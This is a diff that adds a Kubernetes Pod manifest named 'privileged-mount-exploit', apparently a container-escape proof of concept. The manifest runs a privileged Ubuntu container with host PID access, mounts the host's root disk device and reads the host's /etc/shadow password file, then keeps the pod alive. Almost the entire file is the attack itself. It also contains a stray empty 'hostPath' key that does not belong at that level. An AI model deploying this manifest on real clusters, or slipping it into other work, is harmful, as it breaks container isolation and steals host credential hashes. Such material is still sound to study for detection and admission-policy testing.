@@ -1,0 +1,20 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-mount-exploit
+spec:
+  hostPID: true
+  hostPath:
+  containers:
+  - name: ubuntu
+    image: ubuntu
+    securityContext:
+      privileged: true
+    command:
+    - sh
+    - -c
+    - |
+      mkdir -p /mnt/host;
+      mount /dev/sda1 /mnt/host || mount /dev/nvme0n1p1 /mnt/host || echo "failed to mount device";
+      cat /mnt/host/etc/shadow || echo "cannot read host shadow";
+      sleep 3600
